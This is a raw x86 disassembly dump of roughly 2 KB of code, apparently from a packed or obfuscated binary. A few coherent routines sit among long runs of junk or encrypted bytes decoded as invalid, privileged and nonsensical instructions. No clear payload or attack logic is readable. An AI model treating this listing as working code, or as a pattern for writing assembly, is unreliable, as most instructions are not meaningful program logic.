  411280:	sub    eax,0xd7f700a2
  411285:	fdivrp st(3),st
  411287:	jl     0x41129e
  411289:	push   ss
  41128a:	fidiv  WORD PTR [ebx-0x5c]
  41128d:	popa   
  41128e:	test   eax,0xf53ba734
  411293:	sub    DWORD PTR [edi+0x4f],edx
  411296:	mov    eax,0x15726d36
  41129b:	dec    eax
  41129c:	or     al,0x7e
  41129e:	in     eax,0x7e
  4112a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112a1:	ret    
  4112a2:	add    esi,edi
  4112a4:	dec    edi
  4112a5:	aaa    
  4112a6:	sub    al,0x7f
  4112a8:	dec    ecx
  4112a9:	inc    edi
  4112aa:	mov    bh,0xe6
  4112ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112ad:	scas   eax,DWORD PTR es:[edi]
  4112ae:	or     DWORD PTR [ebx+esi*4-0x7f865465],ecx
  4112b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112b6:	and    eax,0x1825624e
  4112bb:	cwde   
  4112bc:	mov    esi,0xcc748301
  4112c1:	sbb    eax,0x7e6ba89a
  4112c6:	pop    es
  4112c7:	les    ebx,FWORD PTR [edi+eax*1-0x34b807c8]
  4112ce:	jo     0x41133b
  4112d0:	(bad)  
  4112d1:	retf   
  4112d2:	mov    esi,0x4c8467e7
  4112d7:	sbb    eax,0xf486e4fd
  4112dc:	lds    edx,FWORD PTR [esi+0x23389b7d]
  4112e2:	das    
  4112e3:	and    edi,esp
  4112e5:	arpl   WORD PTR [esi-0x3d],cx
  4112e8:	push   0x1f
  4112ea:	outs   dx,BYTE PTR ds:[esi]
  4112eb:	aam    0x1c
  4112ed:	cmp    DWORD PTR [ebp-0x7c15b268],0x7eff8c3a
  4112f7:	ss (bad) 
  4112f9:	jp     0x411288
  4112fb:	push   ecx
  4112fc:	test   DWORD PTR ds:0x81b43ee1,eax
  411302:	sbb    BYTE PTR [esp+eax*4],0x0
  411306:	jmp    DWORD PTR [ecx-0x31c2edd9]
  41130c:	dec    esi
  41130d:	dec    esi
  41130e:	aam    0x5d
  411310:	xor    al,0xc7
  411313:	mov    ah,0x7b
  411315:	mov    dh,0x77
  411317:	mov    bl,0xc8
  411319:	out    0x20,eax
  41131b:	shl    BYTE PTR [ebx-0x54b59eb8],1
  411321:	(bad)  
  411322:	or     al,0x8b
  411324:	xchg   ecx,eax
  411325:	(bad)  
  411326:	or     al,BYTE PTR [ebx]
  411328:	repnz or eax,0x579c39fa
  41132e:	test   eax,0xe05c3807
  411333:	jmp    0xdc5a6596
  411338:	cli    
  411339:	xchg   edx,eax
  41133a:	cmc    
  41133b:	mov    edi,0x33a70a30
  411340:	mov    esp,0xeb84d715
  411345:	call   0xb1a2:0xdc095319
  41134c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41134d:	xchg   ebx,eax
  41134e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41134f:	or     edi,DWORD PTR [ebx+0x67]
  411352:	out    0x93,al
  411354:	mov    ebp,0x44fb4aea
  411359:	xchg   esi,eax
  41135a:	scas   al,BYTE PTR es:[edi]
  41135b:	jp     0x411389
  41135d:	clc    
  41135e:	ret    0xb823
  411361:	inc    ebp
  411362:	pop    edi
  411363:	adc    eax,0xdef38e98
  411368:	mov    ds:0xb495ed54,al
  41136d:	rcl    BYTE PTR ds:0xf3156050,0x9
  411374:	and    BYTE PTR [edx+0x27],dh
  411377:	aas    
  411378:	retf   
  411379:	enter  0x8a46,0x44
  41137d:	add    eax,0xc558ba8
  411382:	cmp    al,BYTE PTR [edx]
  411384:	jne    0x411713
  41138a:	mov    eax,DWORD PTR [ebp-0x8]
  41138d:	mov    edx,DWORD PTR [ebp+0xc]
  411390:	movsx  edx,BYTE PTR [edx]
  411393:	xor    eax,ecx
  411395:	add    eax,esi
  411397:	cmp    edx,eax
  411399:	je     0x41156b
  41139f:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4113a6:	lea    eax,[ebp-0x18]
  4113a9:	mov    DWORD PTR [ebp-0x14],eax
  4113ac:	mov    eax,DWORD PTR [ebp-0x14]
  4113af:	add    DWORD PTR [eax],0x705fa8f
  4113b5:	mov    eax,DWORD PTR [ebp-0x10]
  4113b8:	mov    edx,DWORD PTR [ebp+0x8]
  4113bb:	xor    eax,ecx
  4113bd:	lea    eax,[eax+edx*1+0x32729b]
  4113c4:	mov    DWORD PTR [ebp+0x8],eax
  4113c7:	jmp    0x411563
  4113cc:	sub    DWORD PTR [esi-0x26],ebx
  4113cf:	sub    al,0x69
  4113d1:	test   al,0xe9
  4113d3:	pop    ebx
  4113d4:	cld    
  4113d5:	add    DWORD PTR [edx-0x247efc5f],ecx
  4113db:	mov    dh,0x1
  4113dd:	inc    eax
  4113de:	jle    0x41145e
  4113e0:	icebp  
  4113e1:	jg     0x411461
  4113e3:	jle    0x411437
  4113e5:	aad    0x40
  4113e7:	inc    esi
  4113e8:	add    eax,0x6a1a1a26
  4113ed:	xor    BYTE PTR [edx+0x60],bh
  4113f0:	xchg   esp,eax
  4113f1:	mov    eax,ds:0xb8142cee
  4113f6:	test   al,0xab
  4113f8:	stos   DWORD PTR es:[edi],eax
  4113f9:	jbe    0x4113a8
  4113fb:	test   al,0xb4
  4113fd:	mov    edi,0xdc57f00f
  411402:	pop    ecx
  411403:	in     al,dx
  411404:	mov    dl,0x8c
  411406:	adc    DWORD PTR [ecx+ecx*8+0xa],eax
  41140a:	ret    0x801b
  41140d:	int    0x42
  41140f:	lods   eax,DWORD PTR ds:[esi]
  411410:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411411:	jb     0x411447
  411413:	mov    esp,0x34a719ad
  411418:	xchg   edx,eax
  411419:	jle    0x4113f6
  41141b:	and    al,0xcd
  41141d:	and    DWORD PTR [esi],ebp
  41141f:	arpl   WORD PTR [ebx],ax
  411421:	movsx  eax,si
  411424:	nop
  411425:	adc    esi,DWORD PTR [ebx+0x2bc4bb26]
  41142b:	push   0xc020a537
  411430:	jmp    0xfdc6:0x45fc1db4
  411437:	mov    eax,0x35ada107
  41143c:	push   edx
  41143d:	stos   DWORD PTR es:[edi],eax
  41143e:	inc    edi
  41143f:	mov    eax,0x60ea30cb
  411444:	mov    esi,0xeb6fb823
  411449:	push   ebx
  41144a:	pop    edi
  41144b:	push   eax
  41144c:	add    al,0x1b
  41144e:	outs   dx,DWORD PTR ds:[esi]
  41144f:	mov    edx,0xc37a239f
  411454:	pushf  
  411455:	push   ecx
  411456:	enter  0xdc6c,0x2c
  41145a:	or     DWORD PTR [eax+edi*1+0x736d3b03],edi
  411461:	fistp  DWORD PTR [ebx]
  411463:	aaa    
  411464:	stos   BYTE PTR es:[edi],al
  411465:	rol    BYTE PTR [ebx-0x21],1
  411468:	(bad)  
  411469:	cld    
  41146a:	lahf   
  41146b:	sbb    edi,esi
  41146d:	adc    DWORD PTR [edx],ecx
  41146f:	jg     0x4114b9
  411471:	(bad)  
  411472:	sub    al,0x6b
  411474:	mov    al,ds:0x7b0ada0c
  411479:	mov    WORD PTR [esi+ecx*4+0x24],fs
  41147d:	js     0x4114a2
  41147f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411480:	push   ebx
  411481:	rcl    DWORD PTR [eax-0xb],cl
  411484:	(bad)  
  411486:	stos   BYTE PTR es:[edi],al
  411487:	pand   mm1,QWORD PTR [esi+0x6d]
  41148b:	jp     0x4114d9
  41148d:	dec    ecx
  41148e:	adc    al,0x5e
  411490:	cmp    BYTE PTR [esi+0x71],dh
  411493:	mov    dh,BYTE PTR [edx+0x38717d30]
  411499:	test   al,0x2c
  41149b:	retf   0xb2d5
  41149e:	push   ss
  41149f:	into   
  4114a0:	jmp    0x4114c9
  4114a2:	add    DWORD PTR [esi],edi
  4114a4:	push   esp
  4114a5:	loop   0x4114c0
  4114a7:	dec    edx
  4114a8:	cmp    esi,DWORD PTR [ebx]
  4114aa:	hlt    
  4114ab:	jl     0x411448
  4114ad:	call   0xc081:0xf27f931f
  4114b4:	int3   
  4114b5:	cmp    DWORD PTR [esi+0x433b303],edx
  4114bb:	(bad)  
  4114bc:	retf   
  4114bd:	add    edi,DWORD PTR [edi]
  4114bf:	jae    0x411526
  4114c1:	fsub   DWORD PTR [ebx]
  4114c3:	(bad)  
  4114c4:	jge    0x41146e
  4114c6:	arpl   WORD PTR [ecx+0xa0e4459],di
  4114cc:	fnstcw WORD PTR [eax-0x64842958]
  4114d2:	leave  
  4114d3:	add    DWORD PTR [ebp-0x2178309f],edx
  4114d9:	(bad)  
  4114da:	pop    ds
  4114db:	fcmovnb st,st(2)
  4114dd:	mov    ecx,0x629f266a
  4114e2:	fs loop 0x41152f
  4114e5:	scas   al,BYTE PTR es:[edi]
  4114e6:	mov    ss,WORD PTR [edx+0x3c]
  4114e9:	jb     0x4114f3
  4114eb:	pop    ebx
  4114ec:	ja     0x4114ee
  4114ee:	imul   esp,DWORD PTR [ecx+0x87b4464],0x971d9f46
  4114f8:	aad    0xca
  4114fa:	sbb    BYTE PTR [ebp+0x3273ddb5],ch
  411500:	jno    0x4114b7
  411502:	pop    ebx
  411503:	cli    
  411504:	shl    ebx,0xf8
  411507:	ret    0x8e62
  41150a:	test   DWORD PTR [eax-0xd1ffe7],esi
  411510:	arpl   WORD PTR [edi],bp
  411512:	out    dx,al
  411513:	(bad)  
  411514:	sbb    al,0x3d
  411516:	jne    0x41158f
  411518:	sbb    esp,edi
  41151a:	je     0x411520
  41151c:	sub    DWORD PTR [ebp+0x20],0xffffffa9
  411520:	fisttp QWORD PTR [ebp-0x1621994c]
  411526:	pop    ebx
  411527:	lea    edx,[esi+0x5e]
  41152a:	cmp    al,0xea
  41152c:	pop    esp
  41152d:	add    dh,BYTE PTR [esi-0x80]
  411530:	das    
  411531:	mov    edx,DWORD PTR [eax]
  411533:	mov    ebx,ebx
  411535:	pop    eax
  411536:	lock push ebx
  411538:	adc    esp,DWORD PTR [edi-0x1b]
  41153b:	retf   0x10fb
  41153e:	xlat   BYTE PTR ds:[ebx]
  41153f:	adc    DWORD PTR [edi-0xe],esp
  411542:	jns    0x4114df
  411544:	mov    eax,ds:0x484ef48d
  411549:	or     eax,0xcae1ed61
  41154e:	push   0x6c
  411550:	or     dh,bh
  411552:	scas   eax,DWORD PTR es:[edi]
  411553:	add    BYTE PTR [ebp+0x3],al
  411556:	stc    
  411557:	xchg   edx,eax
  411558:	test   eax,0xc8182a2c
  41155d:	iret   
  41155e:	mov    edx,0x82579e30
  411563:	inc    DWORD PTR [ebp+0xc]
  411566:	jmp    0x4111ca
  41156b:	mov    eax,DWORD PTR [ebp-0x10]
  41156e:	xor    eax,ecx
  411570:	jmp    0x41170c
  411575:	jmp    0xe967:0xb166b574
  41157c:	jo     0x41155e
  41157e:	fidiv  WORD PTR [edx-0x5c]
  411581:	or     al,0x30
  411583:	jae    0x411597
  411585:	add    BYTE PTR [ecx+0x7e],0x7e
  411589:	icebp  
  41158a:	jg     0x41160a
  41158c:	jle    0x4115af
  41158e:	xlat   BYTE PTR ds:[ebx]
  41158f:	jae    0x411528
  411591:	aas    
  411592:	into   
  411593:	jmp    0x7ed3cc3c
  411598:	push   gs
  41159a:	pusha  
  41159b:	ins    BYTE PTR es:[edi],dx
  41159c:	add    DWORD PTR [esi+edi*2+0x9],ebx
  4115a0:	add    eax,0x3e0b685
  4115a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115a6:	adc    BYTE PTR [esp+ecx*2],cl
  4115a9:	imul   esp,DWORD PTR [ecx+0x786c1104],0xc5019acc
  4115b3:	(bad)  
  4115b4:	lea    ebp,[edi-0x15]
  4115b7:	retf   
  4115b8:	(bad)  
  4115b9:	mov    esp,0x73f70f04
  4115be:	stos   DWORD PTR es:[edi],eax
  4115bf:	mov    edi,ds
  4115c1:	idiv   esi
  4115c3:	push   0xfffffff4
  4115c5:	jnp    0x411564
  4115c7:	test   eax,0xacd52c56
  4115cc:	(bad)  
  4115cd:	in     eax,0x7e
  4115cf:	mov    ecx,0x6f7d2c8a
  4115d4:	out    dx,al
  4115d5:	les    esi,FWORD PTR [ebx-0x421919f9]
  4115db:	(bad)  
  4115dc:	dec    esp
  4115dd:	out    0x1d,eax
  4115df:	xlat   BYTE PTR ds:[ebx]
  4115e0:	inc    ebp
  4115e1:	xchg   edx,eax
  4115e2:	mov    ds:0x188341ce,al
  4115e7:	push   eax
  4115e8:	int3   
  4115e9:	(bad)  
  4115ea:	mov    esp,DWORD PTR [esp+ebx*2-0x2f6f06be]
  4115f1:	jl     0x4115de
  4115f3:	mov    ecx,0xcda7958f
  4115f8:	push   edx
  4115f9:	fsubr  DWORD PTR [ebx+0x1641269c]
  4115ff:	fisttp DWORD PTR [ebx]
  411601:	cwde   
  411602:	jb     0x411592
  411604:	ss push esp
  411606:	or     ch,BYTE PTR [ebx-0x58f3fd0a]
  41160c:	xor    edi,DWORD PTR [edx+ebx*4+0x2ee48185]
  411613:	xchg   edi,eax
  411614:	add    al,0xce
  411616:	push   ss
  411617:	test   al,0x54
  411619:	mov    edx,0x97cd355f
  41161e:	out    0xd4,eax
  411620:	test   eax,0x52631072
  411625:	rol    DWORD PTR [edx+ecx*4],1
  411628:	sub    al,0xfd
  41162a:	loopne 0x4115bd
  41162c:	pop    es
  41162d:	xchg   ebx,eax
  41162e:	pop    ss
  41162f:	outs   dx,DWORD PTR ds:[esi]
  411630:	pop    es
  411631:	into   
  411632:	cmp    eax,0x48815d2d
  411637:	push   esi
  411638:	mov    ds:0x1d0b0df,al
  41163d:	outs   dx,BYTE PTR ds:[esi]
  41163e:	lods   eax,DWORD PTR ds:[esi]
  41163f:	das    
  411640:	dec    ebp
  411641:	jmp    0x77f:0xbac19d39
  411648:	inc    eax
  411649:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41164a:	repz dec edi
  41164c:	or     DWORD PTR [ecx],esi
  41164e:	jecxz  0x4115f1
  411650:	js     0x4115e1
  411652:	in     eax,0x19
  411654:	adc    ch,dl
  411656:	loop   0x41163c
  411658:	leave  
  411659:	mov    dh,0x9d
  41165b:	imul   DWORD PTR [edi+0x51cbd3fc]
  411661:	jp     0x4115f9
  411663:	fistp  DWORD PTR [edi+edx*8-0x4e]
  411667:	addr16 inc ch
  41166a:	cld    
  41166b:	cld    
  41166c:	leave  
  41166d:	ret    
  41166e:	push   cs
  41166f:	gs repnz pop ebp
  411672:	pop    ds
  411673:	xchg   ecx,eax
  411674:	(bad)  
  411675:	in     al,dx
  411676:	push   eax
  411677:	inc    ecx
  411678:	lea    eax,[ecx-0xd]
  41167b:	xor    ecx,esi
  41167d:	sti    
  41167e:	hlt    
  41167f:	repz pop edx
  411681:	mov    al,ds:0x443d8988
  411686:	mov    ebp,DWORD PTR [ebx+ebp*1]
  411689:	mov    ch,0x4
  41168b:	push   esp
  41168c:	sub    dl,BYTE PTR [ecx]
  41168e:	sbb    al,0xfa
  411690:	xchg   ecx,eax
  411691:	in     al,dx
  411692:	int    0x9f
  411694:	and    BYTE PTR [ebx+eax*2+0x228f3892],cl
  41169b:	xor    al,0x98
  41169d:	(bad)  
  41169e:	es or  eax,0x5591fbb9
  4116a4:	push   es
  4116a5:	jecxz  0x4116b8
  4116a7:	push   esi
  4116a8:	xchg   edx,eax
  4116a9:	jno    0x4116ad
  4116ab:	pop    ebp
  4116ac:	jb     0x4116af
  4116ae:	rcl    DWORD PTR [edi+0x54de72aa],cl
  4116b4:	out    0x90,al
  4116b6:	sbb    DWORD PTR [eax],0x2
  4116b9:	std    
  4116ba:	jne    0x4116be
  4116bc:	xchg   bl,dh
  4116be:	dec    bp
  4116c0:	jb     0x41165f
  4116c2:	add    al,0xe
  4116c4:	call   0xe543:0xb5bae405
  4116cb:	dec    eax
  4116cc:	(bad)  
  4116cd:	pop    es
  4116ce:	lahf   
  4116cf:	inc    edx
  4116d0:	mov    dl,0x47
  4116d2:	ds in  al,0xcd
  4116d5:	mul    BYTE PTR [ebx+edx*1+0xb]
  4116d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116da:	jg     0x4116db
  4116dc:	imul   edi,DWORD PTR [ebx+edi*4],0x7e7be3ac
  4116e3:	fwait
  4116e4:	(bad)  
  4116e5:	jb     0x411677
  4116e7:	fcmovnb st,st(0)
  4116e9:	pop    ecx
  4116ea:	sbb    edx,DWORD PTR ds:0x7ff726a0
  4116f0:	mov    esi,0xd92ac542
  4116f5:	push   0x41
  4116f7:	mov    WORD PTR [ebp+0x42],cs
  4116fa:	loope  0x411683
  4116fc:	or     eax,0xaf32259b
  411701:	enter  0x66bc,0xed
  411705:	jmp    0xc92b:0x2052030b
  41170c:	mov    ecx,DWORD PTR [ebp+0x10]
  41170f:	add    eax,esi
  411711:	mov    DWORD PTR [ecx],eax
  411713:	pop    esi
  411714:	leave  
  411715:	ret    0xc
  411718:	push   ebp
  411719:	mov    ebp,esp
  41171b:	push   ecx
  41171c:	neg    eax
  41171e:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411725:	mov    eax,DWORD PTR [ebp+0x8]
  411728:	adc    DWORD PTR ds:0x43382b,0x2178
  411732:	mov    al,BYTE PTR [eax]
  411734:	sbb    DWORD PTR ds:0x43387b,0x433843
  41173e:	add    al,0x38
  411740:	xor    al,0x46
  411742:	cmp    al,0xc3
  411744:	mov    DWORD PTR ds:0x433883,0x7813
  41174e:	jne    0x411ea2
  411754:	and    edx,DWORD PTR ds:0x4338ab
  41175a:	mov    eax,DWORD PTR [ebp+0x8]
  41175d:	xor    DWORD PTR ds:0x43383b,0x67d7
  411767:	mov    ecx,DWORD PTR [ebp+0x8]
  41176a:	add    edx,0xbb1
  411770:	jmp    0x4119ab
  411775:	jo     0x4117d4
  411777:	sbb    DWORD PTR [esi],0x7171e291
  41177d:	rol    DWORD PTR [edi],1
  41177f:	push   ebx
  411780:	sbb    eax,0x7d31ccb4
  411785:	add    ecx,DWORD PTR [edi+0x7e]
  411788:	jle    0x41179a
  41178a:	jl     0x41180a
  41178c:	jle    0x4117ed
  41178e:	mov    ebx,0x8a7fa37f
  411793:	adc    BYTE PTR [ebx],al
  411795:	mov    cl,0xe7
  411797:	pop    es
  411798:	and    al,0xba
  41179a:	pop    eax
  41179b:	in     eax,dx
  41179c:	mov    ebp,0x97d51118
  4117a1:	(bad)  
  4117a2:	mov    ds:0x8e34d8e3,eax
  4117a7:	cmp    al,0x0
  4117a9:	inc    esp
  4117aa:	call   0x461a:0xea338448
  4117b1:	(bad)  
  4117b2:	call   ebp
  4117b4:	pop    ss
  4117b5:	push   ss
  4117b6:	into   
  4117b7:	je     0x4117e0
  4117b9:	(bad)  
  4117ba:	jmp    0xcc3d:0x628928fa
  4117c1:	das    
  4117c2:	scas   eax,DWORD PTR es:[edi]
  4117c3:	push   0xffffffc5
  4117c5:	retf   0xd990
  4117c8:	fbstp  TBYTE PTR [edi*8+0x52850081]
  4117cf:	cwde   
  4117d0:	add    DWORD PTR [esi+0xc8d306a],0xffffffaa
  4117d7:	out    dx,al
  4117d8:	adc    eax,0x63254400
  4117dd:	push   esi
  4117de:	add    BYTE PTR [edx-0x36],bh
  4117e1:	in     al,0x14
  4117e3:	sub    BYTE PTR [esi+eiz*8-0x43],0x8e
  4117e8:	push   ds
  4117e9:	xchg   DWORD PTR [edi],eax
  4117eb:	je     0x411855
  4117ed:	stc    
  4117ee:	je     0x4117f6
  4117f0:	outs   dx,DWORD PTR ds:[esi]
  4117f1:	loope  0x411800
  4117f3:	dec    esp
  4117f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117f5:	push   0x470a79a7
  4117fa:	outs   dx,BYTE PTR ds:[esi]
  4117fb:	dec    edi
  4117fc:	and    al,0x9b
  4117fe:	adc    DWORD PTR [ecx],0x3cef2f79
  411804:	xchg   esi,eax
  411805:	inc    ebp
  411806:	push   edx
  411807:	pop    eax
  411808:	pop    es
  411809:	and    BYTE PTR [ecx],ah
  41180b:	out    0x2a,al
  41180d:	jne    0x411831
  41180f:	cmp    bh,cl
  411811:	jns    0x4117fa
  411813:	sub    al,0xe1
  411815:	mov    al,0x16
  411817:	add    dh,BYTE PTR [edx+0x155c65a8]
  41181d:	cld    
  41181e:	add    al,0xe2
  411820:	aaa    
  411821:	pusha  
  411822:	push   ds
  411823:	dec    esp
  411824:	iret   
  411825:	loope  0x4117cc
  411827:	loop   0x4118a2
  411829:	scas   al,BYTE PTR es:[edi]
  41182a:	xchg   edx,eax
  41182b:	call   DWORD PTR [edx+0x17]
  41182e:	inc    eax
  41182f:	test   eax,0xff29049f
  411834:	fld    st(2)
  411836:	ja     0x41185c
  411838:	and    DWORD PTR [ebp-0x3b],eax
  41183b:	jmp    0xe314d5eb
  411840:	rol    DWORD PTR [ebp+0x7],1
  411843:	and    al,0x2a
  411845:	sbb    al,0xb5
  411847:	xor    BYTE PTR [ebp+0x59b6ae3],cl
  41184d:	pop    esp
  41184e:	imul   edx,DWORD PTR [esi-0x30],0xfd9eecf1
  411855:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411856:	lea    ecx,[ebx+0x22b3eba4]
  41185c:	xor    ax,si
  41185f:	mov    esp,0x90965bef
  411864:	fcomp  QWORD PTR [esi]
  411866:	(bad)  
  411868:	iret   
  411869:	and    eax,0xe0a11229
  41186e:	jl     0x411844
  411870:	pop    edi
  411871:	cmp    bh,BYTE PTR [ecx-0x32]
  411874:	in     eax,0xda
  411876:	daa    
  411877:	mov    dl,0xde
  411879:	sub    eax,0xf1b923a4
  41187e:	adc    BYTE PTR [esi+0x7784d7bc],al
  411884:	push   cs
  411885:	push   0x3b
  411887:	adc    al,0xe1
  411889:	cmp    BYTE PTR [esi],dl
  41188b:	icebp  
  41188c:	in     eax,0xbd
  41188e:	lock in al,0x1b
  411891:	in     al,dx
  411892:	xchg   esi,eax
  411893:	stos   BYTE PTR es:[edi],al
  411894:	das    
  411895:	sbb    BYTE PTR [ebp+0x32],dl
  411898:	outs   dx,BYTE PTR ds:[esi]
  411899:	clc    
  41189a:	and    BYTE PTR [edx+0x6c50bb03],cl
  4118a0:	bound  esp,QWORD PTR [eax+0x498dfc79]
  4118a6:	adc    BYTE PTR [esi+0x27e7609c],dl
  4118ac:	xchg   ebp,eax
  4118ad:	stos   BYTE PTR es:[edi],al
  4118ae:	data16 in al,dx
  4118b0:	xchg   ebx,eax
  4118b1:	addr16 inc eax
  4118b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118b4:	xchg   DWORD PTR [esi+0x4d],ecx
  4118b7:	cmp    ebx,ebx
  4118b9:	call   0xf1a36d41
  4118be:	or     BYTE PTR [ecx],dl
  4118c0:	out    0x40,al
  4118c2:	ins    DWORD PTR es:[edi],dx
  4118c3:	mov    edi,0x976ebfc6
  4118c8:	stos   BYTE PTR es:[edi],al
  4118c9:	or     al,0x2b
  4118cc:	mov    ds:0x2a4b56dc,al
  4118d1:	(bad)
  4118d4:	push   0xffffffb5
  4118d6:	mov    cl,0xb1
  4118d8:	ret    
  4118d9:	out    dx,al
  4118da:	lds    ebp,FWORD PTR [ebx]
  4118dc:	(bad)  
  4118dd:	fistp  DWORD PTR [ebx+0x5f1b2842]
  4118e3:	mov    ds:0xd690fb38,eax
  4118e8:	cld    
  4118e9:	popf   
  4118ea:	sbb    bl,BYTE PTR [edx+0x3a]
  4118ed:	lods   eax,DWORD PTR ds:[esi]
  4118ee:	mov    cl,BYTE PTR ds:0xef677d81
  4118f4:	mov    bl,0x3b
  4118f6:	mov    esp,0x50032f74
  4118fb:	enter  0x972c,0x2
  4118ff:	jg     0x411883
  411901:	repnz and dh,BYTE PTR [ebx+0x71]
  411905:	sbb    ebp,DWORD PTR cs:[edx+0x1c]
  411909:	mov    edi,0x248f3bcc
  41190e:	push   ds
  41190f:	or     ecx,DWORD PTR [ebp-0x3e]
  411912:	add    DWORD PTR [ecx],esp
  411914:	adc    al,0x55
  411916:	mov    ds:0x5bdcd2a,al
  41191b:	pushf  
  41191c:	xor    ah,ah
  41191e:	(bad)  
  41191f:	fidiv  DWORD PTR [ecx-0x63]
  411922:	fnsave gs:[ebx+0xd]
  411926:	std    
  411927:	mov    eax,ds:0x9ea6281c
  41192c:	fld    QWORD PTR ds:0x88d3e0ce
  411932:	push   ss
  411933:	not    BYTE PTR [edi-0x71]
  411936:	inc    esi
  411937:	mov    edi,0xcef7184f
  41193c:	inc    edi
  41193d:	push   0xffffffd5
  41193f:	bound  ecx,QWORD PTR [edx-0x1afdb4d5]
  411945:	adc    DWORD PTR [ebp+0x3d54c089],0x669c628b
  41194f:	pop    ebx
  411950:	pop    esi
  411951:	sub    ecx,ebp
  411953:	arpl   WORD PTR [esp+ebp*2-0x59],di
  411957:	imul   edi,DWORD PTR [edi],0x15
  41195a:	repz push ds
  41195c:	inc    esi
  41195d:	popa   
  41195e:	(bad)  
  41195f:	sti    
  411960:	inc    ebp
  411961:	call   0x9513:0x8580a610
  411968:	adc    al,0xda
  41196a:	and    dh,BYTE PTR [edx]
  41196c:	add    BYTE PTR [ebx+eiz*4-0x7a30638f],0x49
  411974:	aad    0x41
  411976:	popf   
  411977:	stos   DWORD PTR es:[edi],eax
  411978:	and    al,0x60
  41197a:	ficom  WORD PTR [eax+0x70]
  41197d:	inc    ebp
  41197e:	(bad)  
  411980:	(bad)  
  411981:	repz push ss
  411983:	add    esp,DWORD PTR [edx+0x4ab5ff95]
  411989:	cld    
  41198a:	sub    BYTE PTR [edx],bh
  41198c:	sahf   
  41198d:	lods   al,BYTE PTR ds:[esi]
  41198e:	(bad)  
  41198f:	jne    0x411988
  411991:	(bad)  
  411992:	mov    ah,0xa0
  411994:	push   ecx
  411995:	pop    esi
  411996:	das    
  411997:	jbe    0x411928
  411999:	addr16 xchg ebp,eax
  41199b:	add    al,BYTE PTR [esi+0x4b]
  41199e:	repnz pushf 
  4119a0:	dec    edi
  4119a1:	pop    es
  4119a2:	jmp    0xfbfe5009
  4119a7:	push   ss
  4119a8:	loopne 0x4119a8
  4119aa:	push   ecx
  4119ab:	add    ecx,DWORD PTR [eax+0x3c]
  4119ae:	or     DWORD PTR ds:0x4337a3,ebx
  4119b4:	mov    edx,0x7510854
  4119b9:	mov    DWORD PTR [ebp+0x8],ecx
  4119bc:	and    DWORD PTR ds:0x4338a7,0x0
  4119c6:	jmp    0x4119d6
  4119cb:	mov    eax,ds:0x4338a7
  4119d0:	inc    eax
  4119d1:	mov    ds:0x4338a7,eax
  4119d6:	cmp    DWORD PTR ds:0x4338a7,0x17
  4119dd:	jae    0x4119fe
  4119e3:	cmp    DWORD PTR ds:0x4338a7,0x27
  4119ea:	jne    0x4119f9
  4119f0:	push   DWORD PTR [ebp-0x10]
  4119f3:	call   DWORD PTR ds:0x4123b8
  4119f9:	jmp    0x4119cb
  4119fe:	mov    eax,DWORD PTR [ebp-0x4]
  411a01:	jmp    0x411c3c
  411a06:	pop    edi
  411a07:	pop    edx
  411a08:	dec    eax
  411a09:	pop    es
  411a0a:	dec    ecx
  411a0b:	xor    eax,0xcba06271
  411a10:	outs   dx,DWORD PTR ds:[esi]
  411a11:	aam    0xd4
  411a13:	dec    ebp
  411a14:	inc    eax
  411a15:	dec    eax
  411a16:	and    eax,0x107e7e4d
  411a1b:	jl     0x411a9b
  411a1d:	jle    0x411a17
  411a1f:	cs xchg ebp,eax
  411a21:	rcl    DWORD PTR [edi-0x3e2ecf00],cl
  411a27:	sub    al,0x89
  411a29:	test   dh,cl
  411a2b:	(bad)  
  411a2c:	lock repnz pop edx
  411a2f:	xchg   esi,eax
  411a30:	xchg   edx,eax
  411a31:	xlat   BYTE PTR fs:[ebx]
  411a33:	pop    esi
  411a34:	xchg   ebx,eax
  411a35:	test   BYTE PTR [edx-0x45],al
  411a38:	dec    esp
  411a39:	mov    ch,0x65
  411a3b:	dec    ecx
  411a3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a3d:	clc    
  411a3e:	cmc    
  411a3f:	jle    0x411a06
  411a41:	dec    esi
  411a42:	sub    DWORD PTR [ecx-0x66],edx
  411a45:	xor    BYTE PTR [ebp-0x24],dl
  411a48:	mov    eax,ds:0x39d741b9
  411a4d:	jl     0x411a19
  411a4f:	in     al,0x14
  411a51:	rol    dl,1
  411a53:	shr    DWORD PTR [edx+0x3f],cl
  411a56:	out    dx,eax
  411a57:	int3   
  411a58:	jnp    0x411a86
  411a5a:	out    0xa5,al
  411a5c:	lds    ebx,FWORD PTR [eax+ebp*8]
  411a5f:	enter  0x6759,0x4f
  411a63:	neg    DWORD PTR [ebx+0x2f]
  411a66:	jns    0x411a2d
  411a68:	leave  
  411a69:	sub    al,0xc
  411a6b:	adc    BYTE PTR [edx+esi*4-0x3d],dl
  411a6f:	cld    
  411a70:	(bad)  
  411a72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a73:	pop    esi
  411a74:	mov    edi,cr5
  411a77:	ins    BYTE PTR es:[edi],dx
  411a78:	and    al,0xac
  411a7a:	cmp    al,0xf3
  411a7c:	into   
  411a7d:	packsswb mm1,QWORD PTR [esp+ebx*8]
  411a81:	mov    edi,0x2c596c2a
  411a86:	dec    edx
  411a87:	int3   
  411a88:	cmc    
  411a89:	push   edi
  411a8a:	repnz adc dl,cl
  411a8d:	adc    DWORD PTR [esi-0x1bd85db0],0x5b
  411a94:	mov    ds:0xed742293,eax
  411a99:	test   DWORD PTR [ebx],edi
  411a9b:	adc    eax,ebx
  411a9d:	(bad)
  411aa0:	in     eax,0x79
  411aa2:	lea    esp,[eax]
  411aa4:	mov    ah,dh
  411aa6:	in     al,dx
